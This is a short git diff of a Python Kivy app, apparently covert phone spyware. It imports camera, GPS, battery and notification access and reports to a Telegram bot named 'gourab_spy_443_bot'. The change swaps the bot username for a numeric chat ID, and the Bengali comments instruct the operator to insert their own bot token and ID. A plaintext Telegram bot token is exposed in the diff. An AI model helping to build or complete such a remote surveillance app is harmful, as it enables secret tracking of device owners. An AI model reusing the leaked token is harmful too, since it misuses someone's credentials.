@@ -8,7 +8,7 @@ from plyer import battery, camera, gps, notification
 
 # --- কনফিগারেশন ---
 TOKEN = '8290022165:AAG-o11yW7wOgXRille39fd_jXs_mxbz4lE' # তোমার বটের টোকেন এখানে দাও
-CHAT_ID = 'gourab_spy_443_bot'         # তোমার নিজের টেলিগ্রাম আইডি এখানে দাও (যাতে অন্য কেউ কন্ট্রোল না করতে পারে)
+CHAT_ID = '5602673575'         # তোমার নিজের টেলিগ্রাম আইডি এখানে দাও (যাতে অন্য কেউ কন্ট্রোল না করতে পারে)
 
 class GourabApp(App):
     def build(self):
@@ -74,4 +74,5 @@ class GourabApp(App):
                 time.sleep(5)
 
 if __name__ == '__main__':
+
     GourabApp().run()
